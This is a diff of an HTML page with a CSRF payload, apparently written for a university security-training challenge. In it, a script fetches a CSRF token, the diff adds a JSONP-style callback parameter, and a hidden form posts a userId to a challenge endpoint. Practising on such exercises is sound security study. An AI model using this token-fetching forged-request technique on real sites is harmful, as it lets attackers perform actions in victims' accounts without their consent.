@@ -7,12 +7,17 @@
   <script> 
     var xhr = new XMLHttpRequest();
     console.log("getting token...")
-    xhr.open("GET", "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
+    xhr.open("GET", "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e?callback=some_func", false);
     xhr.send();
     if(xhr.readyState == 4 && xhr.status == 200) {
      console.log(xhr.responseText)
     }		   
+
+  function some_func() {
+    console.log("hello");
+  }
   </script>
+
 
   <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus" method="POST">
     <input type="hidden" name="userId" value="9460e602519f36d858ac6bda083d9de3587ee33e" />
